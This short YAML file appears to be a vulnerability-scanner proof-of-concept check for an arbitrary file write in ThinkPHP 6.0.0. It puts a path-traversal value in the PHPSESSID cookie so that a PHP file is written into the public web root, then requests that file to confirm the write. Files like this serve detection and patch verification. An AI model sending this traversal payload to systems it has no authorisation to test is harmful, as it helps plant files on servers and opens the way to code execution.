name: poc-yaml-tp6-Anyfile-operation-write
set:
  f1: randomInt(800000000, 900000000)
rules:
  - method: GET
    path: /
    headers:
      Cookie: PHPSESSID=../../../../public/{{f1}}.php
    follow_redirects: true
    expression: |
      response.status == 200
  - method: GET
    path: /{{f1}}.php
    follow_redirects: true
    expression: |
      response.status == 200
detail:
  author: Loneyer
  Affected Version: "Thinkphp 6.0.0"
  links:
    - https://github.com/Loneyers/ThinkPHP6_Anyfile_operation_write
